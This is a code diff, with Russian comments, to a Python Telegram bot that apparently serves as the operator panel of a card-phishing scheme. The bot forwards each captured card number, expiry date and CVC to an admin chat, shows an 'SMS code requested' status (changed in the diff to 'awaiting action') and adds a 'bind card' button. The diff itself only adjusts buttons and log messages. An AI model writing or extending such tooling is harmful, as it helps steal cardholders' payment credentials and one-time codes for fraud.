@@ -330,7 +330,7 @@ def get_payment_buttons(payment_id, user_id="user123", card_number=None):
         ]
     ]
     
-    # ВСЕГДА добавляем кнопку "Привязать" независимо от статуса карты
+    # ВСЕГДА добавляем кнопку "Привязать" если есть номер карты
     if card_number:
         buttons.append([
             InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind_{payment_id}_{user_id}_{card_number}")
@@ -622,7 +622,8 @@ async def process_payment_data(message: types.Message):
         if payment_id:
             # Проверяем статус карты В БД СРАЗУ
             card_number = payment_data.get('card_number', '')
-            card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
+            card_in_db = check_card_in_db(card_number)
+            card_status = "ПРИВЯЗАННАЯ КАРТА" if card_in_db else "НЕПРИВЯЗАННАЯ КАРТА"
             
             # Форматируем сообщение в новом стиле СРАЗУ
             formatted_text = f"💳 <b>{card_status}</b>\n\n"
@@ -635,16 +636,17 @@ async def process_payment_data(message: types.Message):
             formatted_text += f"• Номер: {payment_data.get('card_number', '')}\n"
             formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
             formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
-            formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
+            formatted_text += "📱 <b>Статус: Ожидание действий</b>\n\n"
             formatted_text += "Выберите действие:"
             
+            # ВАЖНО: передаем card_number в get_payment_buttons чтобы кнопка "Привязать" была сразу
             await bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=formatted_text,
-                reply_markup=get_payment_buttons(payment_id, "user123", card_number),
+                reply_markup=get_payment_buttons(payment_id, "user123", card_number),  # ← передаем card_number
                 parse_mode="HTML"
             )
-            logger.info(f"✅ Платеж #{payment_id} создан")
+            logger.info(f"✅ Платеж #{payment_id} создан с кнопкой 'Привязать'")
 
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
@@ -1015,6 +1017,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
